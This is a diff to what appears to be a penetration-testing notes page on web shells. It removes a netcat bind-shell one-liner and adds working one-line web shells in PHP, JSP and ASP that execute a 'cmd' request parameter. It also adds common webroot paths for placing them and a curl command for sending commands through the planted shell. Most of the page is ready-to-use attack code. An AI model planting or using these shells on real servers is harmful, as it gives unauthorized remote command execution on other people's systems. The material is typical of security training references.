@@ -14,24 +14,48 @@ layout:
 
 # Web Shell
 
-Is a technique where we upload a script on the language a website is based on, that lets the app to accept commands through HTTP request parameters, and pass them to the internal system of the server to be executed by the internal shell.
+A **Web Shell** is a technique where we upload a script written on the programming language a website is based on, that lets the app accept commands through HTTP request parameters, and pass them to the server's system to be executed by the internal shell.
+
+This process can be done when we have access to the target's root web directory and we can upload a script to be executed through the web browser.
 
 ## <mark style="color:orange;">Basic script</mark>
 
-* &#x20;Use and script that establishes a listening port on the target machine
+* Create a script that processes the parameter from the request for the corresponding web language
 
-{% code title="BindShell.sh" overflow="wrap" lineNumbers="true" %}
+{% code title="WebShell.php" overflow="wrap" lineNumbers="true" %}
 ```bash
-#!/bin/bash
-
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp $port >/tmp/f
+<?php system($_REQUEST["cmd"]); ?> #PHP server
 ```
 {% endcode %}
 
-* Connect to the listening port we have set using Netcat
+{% code title="WebShell.jsp" overflow="wrap" lineNumbers="true" %}
+```bash
+<% Runtime.getRuntime().exec(request.getParameter("cmd")); %> #Java JSP server
+```
+{% endcode %}
+
+{% code title="WebShell.asp" overflow="wrap" lineNumbers="true" %}
+```bash
+<% eval request("cmd") %> #Microsoft .Net server
+```
+{% endcode %}
+
+* Then upload the script to the webroot directory of the server on the target machine. Some directories for well-known servers are:
+  * _/var/www/html/_ for Apache
+  * _/usr/local/nginx/html/_ for Nginx
+  * _C:\inetpub\wwwroot_ for IIS
+  * _C:\xampp\htdocs\\_ for XAMPP
 
 {% code overflow="wrap" lineNumbers="true" %}
 ```bash
-nc $IP $port
+cat $webshellscript > $webroot/$webshellscript
+```
+{% endcode %}
+
+* Access to the Web Shell by sending a request with the URL parameter defined on the script to send a command as value to execute it
+
+{% code overflow="wrap" lineNumbers="true" %}
+```bash
+curl http://$IP:$port/shell.php?cmd=$command
 ```
 {% endcode %}
